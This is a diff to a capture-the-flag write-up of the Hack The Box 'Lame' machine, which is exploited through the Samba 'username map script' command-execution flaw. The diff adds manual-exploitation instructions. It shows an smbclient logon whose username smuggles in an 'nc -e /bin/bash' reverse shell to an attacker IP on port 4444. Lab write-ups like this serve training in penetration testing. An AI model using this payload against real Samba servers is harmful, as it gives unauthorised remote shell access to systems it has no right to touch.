@@ -9,7 +9,7 @@ tags: [ 'samba', 'oscp-like-machine' ]
 
 **DIGEST**
 
-An initial Nmap scan result will show us a vulnerable samba service which is running on port 139. It's vulnerable to the "Samba username map script" vulnerability and exploited using both Manual and Metasploit module.
+An initial Nmap scan result will show us a vulnerable samba service which is running on port 139. It's vulnerable to the "Samba username map script" vulnerability and exploited using both Manual command and Metasploit module.
 
 ![lame](../../../../img/htb/lame/lame.png)
 
@@ -84,7 +84,7 @@ An initial Nmap scan result will show us a vulnerable samba service which is run
 
 **Vulnerable Samba service on port 139:**
 
-This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!
+Exploting the command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!
 
 **Searchsploit:**
 
@@ -103,6 +103,8 @@ This module exploits a command execution vulnerability in Samba versions 3.0.20 
 ![root](../../../../img/htb/lame/lame-hash.png)
 
 **Manual Exploitation:**
+
+Log in as an anonymous user via smbclient. Listen on port 4444 and run the below script to get a reverse shell.
 
 > logon “./=`nohup nc -e /bin/bash 10.10.14.18 4444`"
 
